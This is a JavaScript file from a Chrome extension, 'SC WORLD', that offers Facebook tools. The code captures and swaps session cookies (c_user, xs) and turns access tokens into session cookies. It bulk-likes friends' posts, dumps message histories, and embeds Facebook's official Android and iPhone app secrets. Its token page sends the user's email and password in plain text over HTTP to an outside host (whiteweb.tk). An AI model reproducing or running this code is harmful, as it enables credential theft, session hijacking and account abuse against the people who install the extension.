$(function(){
    chrome.cookies.get({"url": "https://facebook.com", "name": "c_user"}, function(cookie) {
        if(cookie.value){$("#user").html('<a href="https://facebook.com/profile.php?id='+cookie.value+ 'target="_blank>'+cookie.value+'</a>');}
        else{ $("#user").html('<a href="https://facebook.com">'+chrome.i18n.getMessage("login")+'</a>');}
    });
});
function sign_as(){
    chrome.storage.sync.get({"access_token":{}},function(token){
        token = token["access_token"];
        if(token.length > 5){
            $.ajax({url: "https://graph.facebook.com/v3.1/me?fields=id%2Cname%2Cpicture&access_token="+token, method: "get", success: function(e){
                name = e["name"];
                id = e["id"];
                picture = e["picture"];
            $("body").append('<div class="popup_log_ass popup_log_started"><div class="title_log">'+chrome.i18n.getMessage("login_as")+'</div><div class="body_log_ass"><div class="img_user"> <img src="'+picture+'"></div><div class="name_user">'+name+'<div class="logout_acc">'+chrome.i18n.getMessage("log_out")+'</div></div></div></div>');
            $(function() {
                $(".logout_acc").click(function(){
                    chrome.storage.sync.remove("access_token",function(e){
                        window.location.reload();
                    });
                })
                setTimeout(function () {
                    $(".popup_log_ass").removeClass("popup_log_started").addClass("popup_log_close").css({"top":"-50px","opacity":"0"});
                },3000)
            });
                },
            error: function(e){
                picture = "/MEDIA/user_unknow.png";
                $("body").append('<div class="popup_log_ass popup_log_started"><div class="title_log">'+chrome.i18n.getMessage("log_exprice")+'</div><div class="body_log_ass"><div class="img_user"> <img src="'+picture+'"></div><div class="name_user"><div class="login_acc">'+chrome.i18n.getMessage("login")+'</div></div></div></div>');
                $(function(){
                    $(".login_acc").click(function(){ window.location.href = "/HTML/get_token.html"})
                    setTimeout(function(){
                        $(".popup_log_ass").removeClass("popup_log_started").addClass("popup_log_close").css({"top":"-50px","opacity":"0"});
                    },3000)
                })
            } });

        }
        else{
            picture = "/MEDIA/user_unknow.png";
            $("body").append('<div class="popup_log_ass popup_log_started"><div class="title_log">'+chrome.i18n.getMessage("not_log")+'</div><div class="body_log_ass"><div class="img_user"> <img src="'+picture+'"></div><div class="name_user"><div class="login_acc">'+chrome.i18n.getMessage("login")+'</div></div></div></div>');
            $(function(){
                $(".login_acc").click(function(){ window.location.href = "/HTML/get_token.html"})
                setTimeout(function(){
                    $(".popup_log_ass").removeClass("popup_log_started").addClass("popup_log_close").css({"top":"-50px","opacity":"0"});
                },3000)
            })
        }
    })
}
sign_as();
$(function(){
    var element = document.createElement("script");
    element.src = "/JS_main/languages.js";
    document.head.appendChild(element);
    if(window.location.href.indexOf("edit.html") <=-1){
    var element = document.createElement("script");
    element.src = "/JS_main/config.js";
    document.head.appendChild(element);
}
    $("body").prepend('<div class="header"><div class="logo_big"><a href=""><i class="fab fa-medrt fa-3x"></i><div class="logo">SC WORLD</div></a></div><div class="author"><a href="https://www.facebook.com/groups/863000743881330/">'+chrome.i18n.getMessage("help")+'</a></div><div class="follow_au"><a href="https://facebook.com/Ily1606">'+chrome.i18n.getMessage("follow_author")+'</a></div></div>');
    if (window.location.href.indexOf("no-facebook.html") <= -1) {
        $(".body_dal").prepend('<div class="left_modal"><div class="header_left"><div class="info_user"><i class="fas fa-user-circle" id="fisrt"></i>'+chrome.i18n.getMessage("user_info")+'</div><table id="info" width="100%" border="1"><tr><td width="50%"><i class="fas fa-file-alt" id="fisrt"></i>'+chrome.i18n.getMessage("version")+'</td><td width="50%" id="version">'+chrome.i18n.getMessage("underfine")+'</td></tr><tr><td width="50%"><i class="fab fa-facebook" id="fisrt"></i>'+chrome.i18n.getMessage("FB_UID")+'</td><td id="user">chrome.i18n.getMessage("underfine")</td></tr><tr><td width="50%"><i class="far fa-edit" id="fisrt"></i>'+chrome.i18n.getMessage("status")+'</td><td width="50%" id="status_user">'+chrome.i18n.getMessage("underfine")+'</td></tr><table width="100%" border="1" id="info"><tr><td><i class="fas fa-users" id="fisrt"></i><a href="https://www.facebook.com/groups/863000743881330/">'+chrome.i18n.getMessage("join_group")+'</a></td></tr></table></table></div><div class="space_div"></div><div class="header_left"><div class="info_user"><i class="fas fa-wrench" id="fisrt"></i>'+chrome.i18n.getMessage("tool_main")+'</div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_12")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_13")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_14")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_15")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_1")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("change_theme")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("change_sound")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_10")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_11")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_17")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_3")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_4")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_5")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_15")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_16")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_19")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_20")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_21")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_22")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_23")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_23")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("more_3")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_6")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_8")+'</span></div><div class="abt"><i class="fas fa-puzzle-piece" id="fisrt"></i><span>'+chrome.i18n.getMessage("tool_9")+'</span></div></div></div>');
    }
    after_load();
});
function after_load(){
chrome.storage.sync.get({"user": {}}, function (load_from) {
    if (load_from["user"] == "admin") {
        $("#status_user").html(chrome.i18n.getMessage("addmin_ii"));
    } else {
        $("#status_user").html(chrome.i18n.getMessage("user_ii"));
    }
});
$.getJSON("/manifest.json", function (json) { $("#version").html('v'+ json["version"]); });
$(function(){ if(window.location.href.indexOf("status_security_facebook.html") >=0){
    chrome.cookies.get({"url": "https://facebook.com", "name": "c_user"}, function(cookie) {
$(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/settings/account/email.php?dpr=1&__user="+cookie.value+"&__a=1", false);
    xhr.send();
    if(xhr.responseText.search("primary_email") <=-1){ $("#email_in").html(chrome.i18n.getMessage("non_safe"))}else{ $("#email_in").html(chrome.i18n.getMessage("safe")); }
});
$(function() {
    var xhr = new XMLHttpRequest();
     xhr.open("GET", "https://www.facebook.com/ajax/settings/mobile/phones.php?__a=1", false);
     xhr.send();
     if(xhr.responseText.search('selected') <=-1){ $("#number_in").html(chrome.i18n.getMessage("non_safe"))}else{ $("#number_in").html(chrome.i18n.getMessage("safe")); }
     });
$(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/settings/security/trusted_friends.php?__a=1", false);
    xhr.send();
    if(xhr.responseText.search('fbNoTrustedFriends') <=-1){ $("#friend_in").html(chrome.i18n.getMessage("non_safe"))}else{ $("#friend_in").html(chrome.i18n.getMessage("safe")); }
        });
$(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/settings/notifications/medium/?tab=notifications&section=email&dpr=1&__a=1", false);
    xhr.send();
    if(xhr.responseText.search('notif_type_turned_off_none') <=-1){ $("#info_email").html(chrome.i18n.getMessage("non_safe"))}else{ $("#info_email").html(chrome.i18n.getMessage("safe")); }
        });
    }); }});
$(function() { var cookie = [];
	var	cookie_table = new Object();
    if (window.location.href.indexOf('InitialChatFriendsList.html') > -1) {
        chrome.cookies.get({"url": "https://facebook.com", "name": "c_user"}, function (cookie) {
            $("#load_data").load("https://facebook.com/" + cookie.value + " script", function (data) {
                var dataFilter = '{"list" ' + data.split("InitialChatFriendsList")[1].split("list")[1].split(",shortProfiles:")[0] + '}';
                jsonFilter = JSON.parse(dataFilter);
                for (var i = 1; i < jsonFilter.list.length; i++) {
                    var id = jsonFilter.list[i].split('-')[0];
                    $("table#initinalChat").append("<tr><td>" + i + "</td><td>" + "<img src='http://graph.facebook.com/" + id + "/picture?type=normal'></td><td><a href='https://facebook.com/" + id + "'>"+chrome.i18n.getMessage("visit")+"</a><a id='" + id + "' class='sending'>"+chrome.i18n.getMessage("send_to")+"</a></td></tr>");
                    $(".loading").hide();
                    $("body").css({"overflow": "auto"});
                } $(".sending").click(function() {
                    $("#id_to").val($(this).attr("id"));
                    $(".hide").show();
                    $(this).parent().parent().parent().children().css({"border": "0px"});
                    $(this).parent().parent().css({"border": "2px solid red"});
                    setTimeout(function(){
                    chrome.tabs.captureVisibleTab(null, {format: 'png'}, function (data) {
                        const img = new Image
                        $("#target").attr({"src": data});
                        $("#paste_img").val(data)
                    }) },1000); });
                    $(".sent_info>input").click(function(){
                       
                });
            });
        });
    }
if(window.location.href.indexOf("edit.html") >=0){	
chrome.storage.sync.get({"sync_cookie":"","access_token":""},function(sc_world){
count = Object.keys(sc_world).length;
if(sc_world["sync_cookie"].c_user.length >0){
for (var i = 0; i< count; i++){
var c_user = sc_world["sync_cookie"].c_user;
var ex_user = sc_world["sync_cookie"].ex;
var xs__user = sc_world["sync_cookie"].xs
var date_ex = new Date(ex_user*1000);
				$("#cookie").append("<tr><td>"+$("#cookie>tbody>tr").length+"</td><td><input value='"+c_user+"'></td><td><input value='"+xs__user+"'></td><td><input value='"+date_ex.getHours()+":"+date_ex.getMinutes()+":"+date_ex.getSeconds()+"  "+date_ex.getDate()+"/"+date_ex.getMonth()+"/"+date_ex.getYear()+"'></td><td><span class='use_cookie'>"+chrome.i18n.getMessage("use")+"</span><span class='delete_cookie'>"+chrome.i18n.getMessage("delete")+"</span></td></tr>"); }
		}
    if(sc_world["sync_cookie"].c_user.length >0){
        $("input#lg_token").val(sc_world["access_token"]);
    }
    $("#add-token").click(function(){
        chrome.storage.sync.set({"access_token":$("input#lg_token").val()});
        $.get('https://graph.facebook.com/app', {
            access_token: sc_world["access_token"]
        }).done(function(e) {
            $.get('https://api.facebook.com/method/auth.getSessionforApp', {
                access_token: sc_world["access_token"],
                format: 'json',
                new_app_id: e.id,
                generate_session_cookies: '1'
            }).done(function (e) {
                chrome.cookies.remove({"url": "https://facebook.com", "name":"c_user"});
                chrome.cookies.set({ url: "https://.facebook.com/", name: "c_user", value: e["session_cookies"][0]["value"] });
                chrome.cookies.remove({"url": "https://facebook.com", "name":"xs"});
                chrome.cookies.set({ url: "https://.facebook.com/", name: "xs", value: e["session_cookies"][1]["value"] });
                chrome.tabs.create({url: "https://facebook.com"});
            });
            });
        });
wait_load(xs__user, c_user);
});
function wait_load(xs__user,c_user){
$("#cookie>tbody>tr>td").children("span:nth-of-type(1)").click(function(){
chrome.cookies.remove({"url": "https://facebook.com", "name":"c_user"});
chrome.cookies.set({ url: "https://.facebook.com/", name: "c_user", value: c_user });
chrome.cookies.remove({"url": "https://facebook.com", "name":"xs"});
chrome.cookies.set({ url: "https://.facebook.com/", name: "xs", value: xs__user });
chrome.tabs.create({url: "https://facebook.com"});
});
$("#cookie>tbody>tr>td").children("span:nth-of-type(2)").click(function(){ chrome.storage.sync.remove("sync_cookie"); }); }
	$("#add-cookie").click(function(){
			chrome.cookies.get({"url": "https://facebook.com", "name": "c_user"}, function (cookie_name) {
				chrome.cookies.get({"url": "https://facebook.com", "name": "xs"}, function (cookie_xs) { 
var date_ex = new Date(cookie_xs.expirationDate*1000);
				$("#cookie").append("<tr><td>"+$("#cookie>tbody>tr").length+"</td><td><input value='"+cookie_name.value+"'></td><td><input value='"+cookie_xs.value+"'></td><td><input value='"+date_ex.getHours()+":"+date_ex.getMinutes()+":"+date_ex.getSeconds()+"  "+date_ex.getDate()+"/"+date_ex.getMonth()+"/"+date_ex.getYear()+"'></td><td><span class='use_cookie'>"+chrome.i18n.getMessage("use")+"</span><span class='delete_cookie'>"+chrome.i18n.getMessage("delete")+"</span></td></tr>");
cookie_table["c_user"] = cookie_name.value;
cookie_table["xs"] = cookie_xs.value;
cookie_table["ex"] = cookie_xs.expirationDate;
cookie.push(cookie_table);
chrome.storage.sync.set({"sync_cookie":cookie_table});
				});
			});
			});
}
});
$(function(){
	if(window.location.href.indexOf("no-facebook.html") >=0){
		$(".body_modal").css({"display":"block","margin":"auto","width": "90%"});
		$(".body_dal").css({"padding-left":"0px"});
        chrome.storage.sync.get({"access_token":""},function(sc_world){
		$.ajax({url: "https://graph.facebook.com/v3.1/me?fields=threads.limit(1000000){message_count,name,senders,link,unread_count}&access_token="+sc_world["access_token"], method:"get"}).done(function(e){
		    data = e["threads"]["data"];
		    data.sort(function(a, b){return b["message_count"] - a["message_count"]});
		    for(var i = 0; i< data.length; i++){
                if(i == data.length - 1){
                    $(".loading").hide();
                }
			$("#count_msg>tbody").append("<tr><td>"+(i+1)+"</td><td>"+data[i]["senders"]["data"][0]["id"]+"</td><td><img src='http://graph.facebook.com/" +data[i]["senders"]["data"][0]["id"]+ "/picture?type=normal'><a href='https://facebook.com/"+data[i]["link"]+"' target='_blank'>"+(data[i]["senders"]["data"].length > 2 ? data[i]["name"]: data[i]["senders"]["data"][0]["name"])+"</a></td><td>"+(data[i]["senders"]["data"].length > 2 ? "GROUP": "USERS")+"</td><td>"+data[i]["message_count"]+"</td><td>"+data[i]["unread_count"]+"</td></tr>");
		}
			}); });
	}
});
$(function(){ 
if(window.location.href.indexOf("grow_rep.html") >=0){
chrome.storage.sync.get({"access_token":""},function(token){
	$.ajax({
                            url: 'https://graph.facebook.com/v3.0/me?fields=friends.limit(0)&access_token='+token["access_token"],
                            type: 'GET',
							success: function(data){
							total_friend = data["friends"]["summary"]["total_count"];
	$.ajax({
                            url: 'https://graph.facebook.com/v3.0/me?fields=friends.limit('+total_friend+')&access_token='+token["access_token"],
                            type: 'GET',
							async: false,
							success: function(data){
							$(".loading").hide();
							data_friend =data["friends"]["data"];
							for(var i=0; i< data_friend.length; i++){
							$("table#grow_rep>tbody").append("<tr><td>"+(i+1)+"</td><td>"+data_friend[i]["id"]+"</td><td><img src='http://graph.facebook.com/" +data_friend[i]["id"]+"/picture?type=normal'><a href='https://facebook.com/"+data_friend[i]["id"]+"' target='_blank'>"+data_friend[i]["name"]+"</a></td><td></td><td><input type='checkbox' id='one_for_all'></td></tr>");
							}
							$("#one_all").click(function(){ $("table#grow_rep input").each(function(){ $(this).prop('checked', true); });});
							$("table#grow_rep input").click(function(){ if($("input:checked") !=true){
								$("table#grow_rep tr:nth-of-type(1) input").prop('checked', false);
							}
							});
							$(".body_modal button").click(function(){
								for(var j = 0; j < $("table#grow_rep tr").length; j++){
								if($("table#grow_rep tr:nth-of-type("+j+") input:checkbox:checked").length >0){
									$("table#grow_rep tr:nth-of-type("+j+") td:nth-of-type(4)").text("Pending");
									var id = $("table#grow_rep tr:nth-of-type("+j+") td:nth-of-type(2)").text();
	$.ajax({
                            url: 'https://graph.facebook.com/v3.0/'+id+'?fields=feed.limit(10)&access_token='+token["access_token"],
                            type: 'GET',
							async: false,
							success: function(data_feed){
							for(var iii=0; iii< data_feed["feed"]["data"].length; iii++){
								daaa= data_feed["feed"]["data"][iii]["id"];
	$.ajax({
                            url: 'https://graph.facebook.com/v3.0/'+daaa+'/likes?access_token='+token["access_token"],
                            type: 'POST',
							async: false,
								});
							if(iii == data_feed["feed"]["data"].length - 1){
								$("table#grow_rep tr:nth-of-type("+j+") td:nth-of-type(4)").text("Success");
							}
								
								}
								}
								}); }
								}
							}); },
                            error: function () {
                                alert(chrome.i18n.getMessage("warning_login_fb"));
                            }
                        });
							},
                            error: function () {
                                alert(chrome.i18n.getMessage("warning_login_fb"));
                            }
                        });
});	
}
});
$(function(){
	if(window.location.href.indexOf("setting_optimization.html") >=0){
	chrome.storage.sync.get({"optimization_me":[]},function(data){ data = data["optimization_me"];
		for(var i =0; i<data.length; i++){
			$("#memory tbody").append("<tr><td>"+(i+1)+"</td><td>"+data[i]+"</td><td id='remove'>"+chrome.i18n.getMessage("delete")+"</td></tr>");
		}
		$('td#remove').click(function(){ index = $(this).parent().index()- 1;
		data.splice(index, 1);
		chrome.storage.sync.set({"optimization_me":data});
		window.location.reload();
	});
	$("button#add-whitelist").click(function(){
		if($("#value_whitelist").val().length >0){
		data.push($("#value_whitelist").val());
		chrome.storage.sync.set({"optimization_me":data});
		window.location.reload();
		}
		else{alert(chrome.i18n.getMessage("pls_in_domain"));}
	});
	});
	}
    if(window.location.href.indexOf("find_online.html") >=0){
chrome.storage.sync.get({"access_token":{}},function(sc_world) {
    $.ajax({url: "https://graph.facebook.com/me?access_token="+sc_world["access_token"], method: "get"}).done(function (e) {
        $.ajax({
            url: "https://graph.facebook.com/fql?q=SELECT uid, name, pic_square, online_presence FROM user WHERE online_presence IN ('active', 'idle') AND uid IN (SELECT uid2 FROM friend WHERE uid1 = " + e["id"] + ")&access_token=" + sc_world["access_token"] + "&method=GET",
            method: "get", success: function (sc_world) {
                data = sc_world["data"];
                for (var i = 0; i < data.length; i++) {
                    if (data[i]["online_presence"] == "active") {
                        $("#who_online>tbody").append('<tr><td>' + (i + 1) + '</td><td>' + data[i]["uid"] + '</td><td><img src="' + data[i]["pic_square"] + '">' + data[i]["name"] + '</td></tr>');
                    }
                    if (i == data.length - 1) {
                        $(".loading").hide();
                    }
                }
            }
        });
    });
});
    }
    if(window.location.href.indexOf("history_message.html") >=0) {
        setTimeout(function () {
            $(".loading").hide();
        }, 3000);
        id_user_search =0;
        function load_quy(url){
            $.ajax({url: url, method: "get"}).done(function(e){
            if(e["paging"]["next"] !=undefined){
                load_quy(e["paging"]["next"]);
            }
            else{
                $(".searching").hide();
                for(var i = e["data"].length - 10; i < e["data"].length;i++){
                    $(".time_cre").text(e["data"][i]["created_time"]);
                    $("#history").prepend('<tr><td id="'+(e["data"][i]["from"]["id"] !=id_user_search ? "you_said": "other_said")+'">'+e["data"][i]["message"]+'</td></tr>');
                }
            }
            })
        }
        $(".search_user>span").click(function () {
            if( $("#user_search_ms").val().length >1) {
                $(".searching").show();
                $(".search_data *").text("");
                chrome.storage.sync.get({"access_token": ""}, function (sc_world) {
                    $.ajax({
                        url: "https://graph.facebook.com/v3.1/me?fields=threads.limit(1000000){senders,id}&access_token=" + sc_world["access_token"],
                        method: "get"
                    }).done(function (e) {
                        id_user_search = $("#user_search_ms").val();
                        data = e["threads"]["data"];
                        for (var i = 0; i < data.length; i++) {
                            if (data[i]["senders"]["data"].length == 2) {
                                if (data[i]["senders"]["data"][0]["id"] == $("#user_search_ms").val()) {
                                    load_quy("https://graph.facebook.com/v3.1/" + data[i]["id"] + "/messages?fields=message,from,created_time&limit=499&access_token=" + sc_world["access_token"]);
                                }
                            }
                        }
                    });
                })
            }
        });
    }
    if(window.location.href.indexOf("get_token.html") >=0) {
        api_key = "";
        sec_ret = "";
        setTimeout(function(){
            $(".loading").hide();
            },3000);
        $("#submit_token").click(function() {
            $(".searching").show();
            if($("#device").val() =="android"){
                api_key = "3e7c78e35a76a9299309885393b02d97";
                sec_ret = "c1e620fa708a1d5696fb991c1bde5662";
            }
            if($("#device").val() =="iphone"){
                api_key = "882a8490361da98702bf97a021ddc14d";
                sec_ret = "62f8ce9f74b12f84c123cc23437a4a32";
            }
            $(function() {
                $.ajax({
                    url: "http://whiteweb.tk/tool/md5.php", method: "GET",
                    data: {"data": "api_key="+api_key+"credentials_type=passwordemail=" + $("#user_name").val() + "format=JSONgenerate_machine_id=1generate_session_cookies=1locale=vi_vnmethod=auth.loginpassword=" + $("#pass").val() + "return_ssl_resources=0v=1.0"+sec_ret}
                }).done(function (sig) {
                    $.ajax({
                        url: "https://api.facebook.com/restserver.php?api_key="+api_key+"&credentials_type=password&email=" + $("#user_name").val() + "&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=vi_vn&method=auth.login&password=" + $("#pass").val() + "&return_ssl_resources=0&v=1.0&sig=" + sig,

                        success: function (e) {
                            if (e["access_token"] == undefined) {
                                alert(e["error_msg"]);
                            }
                            $("#token_rep").val(e["access_token"]);
                            $(".searching").hide();
                        },
                        error: function (e) {
                            alert("Có lỗi xuất hiện");
                        }
                    });
                });
            });
        });
        $("#save_token").click(function(){
            chrome.storage.sync.set({"access_token":$("#token_rep").val()},function(){
                $("#save_token").text("ĐÃ LƯU");
            });
        })
    }
    $("#search_b").click(function(){
        search();
    });
    function search(){
        var i = 0;
        $.when($(".body_table table tr:not(tr:nth-of-type(1)) td:not(td:nth-of-type(1))").each(function(){
            if($(this).text().toLowerCase().indexOf($("#search_q").val()) >=0) {
                $(this).css({"color": "red"}).children().css({"color": "red"}); i++;
            }
            else{
                $(this).removeAttr("style").children().removeAttr("style")
            }
        })).done(function(){ if(i >0){$("#total_re").text("Có "+i+" kết quả được tìm thấy!")}else{$("#total_re").text("Không tìm thấy!")}});
    }
});
}
